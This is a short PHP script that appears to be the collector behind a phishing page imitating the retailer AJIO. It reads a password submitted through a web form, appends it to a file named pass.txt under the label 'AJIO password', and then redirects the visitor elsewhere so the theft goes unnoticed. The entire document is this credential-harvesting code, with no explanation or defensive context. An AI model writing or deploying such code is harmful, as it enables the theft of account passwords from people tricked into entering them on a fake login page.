<?php
file_put_contents("pass.txt", "AJIO password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
